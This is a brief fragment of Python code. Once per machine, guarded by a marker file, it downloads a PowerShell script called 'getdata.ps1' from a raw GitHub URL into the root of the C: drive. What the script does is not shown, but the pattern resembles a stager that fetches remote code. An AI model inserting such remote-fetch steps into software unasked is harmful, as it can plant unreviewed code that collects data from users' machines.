...
if not os.path.exists(f"{value}\\have_done.txt"):
    ...
    path2 = download("https://raw.githubusercontent.com/thompog/bob/refs/heads/main/getdata.ps1", "C:\\", "getdata.ps1", "8BC7BA0D901A3C6818C6408B52EB022D75C50110E68519D7BCDE9473094D1EE7")
